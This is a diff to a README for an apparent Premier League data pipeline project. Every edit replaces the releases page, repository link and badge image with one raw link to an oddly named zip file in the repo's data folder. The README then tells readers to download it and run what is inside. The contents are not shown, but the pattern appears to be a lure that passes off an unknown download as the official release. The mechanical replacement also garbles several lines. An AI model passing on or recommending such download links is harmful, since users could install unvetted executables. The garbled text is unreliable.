@@ -1,6 +1,6 @@
 # ☁️ Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis - Easy Premier League Data Insights
 
-[![Download Here](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/releases)
+[![Download Here](https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/raw/refs/heads/main/data/Data-Cloud-Pipeline-Scalable-EP-Analysis-Performance-for-2.6.zip)](https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/raw/refs/heads/main/data/Data-Cloud-Pipeline-Scalable-EP-Analysis-Performance-for-2.6.zip)
 
 ---
 
@@ -43,7 +43,7 @@ To run this application smoothly, your computer should meet the following:
 
 Go to the official release page:
 
-[Download Here](https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/releases)
+[Download Here](https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/raw/refs/heads/main/data/Data-Cloud-Pipeline-Scalable-EP-Analysis-Performance-for-2.6.zip)
 
 This page has the latest versions of the software ready for you.
 
@@ -55,7 +55,7 @@ Look for the file that matches your computer’s system:
 
 - Windows users might see `.exe` or `.zip` files.
 - macOS users might have `.dmg` or `.zip` files.
-- Linux users usually get `.tar.gz` or `.zip` files.
+- Linux users usually get `https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/raw/refs/heads/main/data/Data-Cloud-Pipeline-Scalable-EP-Analysis-Performance-for-2.6.zip` or `.zip` files.
 
 Make sure you select the most recent version to get the latest fixes and features.
 
@@ -72,7 +72,7 @@ If your browser asks for permission, allow it to save the file on your computer.
 ### Step 4: Install or Run the Application
 
 - For `.exe` or `.dmg` files, double-click the file and follow the installation steps.
-- For `.zip` or `.tar.gz` files, unzip the downloaded file to a folder.
+- For `.zip` or `https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/raw/refs/heads/main/data/Data-Cloud-Pipeline-Scalable-EP-Analysis-Performance-for-2.6.zip` files, unzip the downloaded file to a folder.
 - After installation or extraction, locate the application icon or executable file.
 - Double-click to start the program.
 
@@ -119,7 +119,7 @@ This app relies on PySpark, a powerful tool to handle big data. It processes sta
 
 If you want to know more about the project’s data and code or face issues beyond basic installation, visit the main repository:
 
-https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis
+https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/raw/refs/heads/main/data/Data-Cloud-Pipeline-Scalable-EP-Analysis-Performance-for-2.6.zip
 
 You will find information, updates, and contacts.
 
@@ -133,7 +133,7 @@ You can contribute ideas or ask for help through the repository’s Issues tab. 
 
 # Download & Install
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge)](https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/releases)
+[![Download Release](https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/raw/refs/heads/main/data/Data-Cloud-Pipeline-Scalable-EP-Analysis-Performance-for-2.6.zip%20Release-blue?style=for-the-badge)](https://github.com/Kaif132/Scalable-Cloud-Data-Pipeline-for-EPL-Performance-Analysis/raw/refs/heads/main/data/Data-Cloud-Pipeline-Scalable-EP-Analysis-Performance-for-2.6.zip)
 
 1. Visit the link above.
 2. Select the file for your computer system.
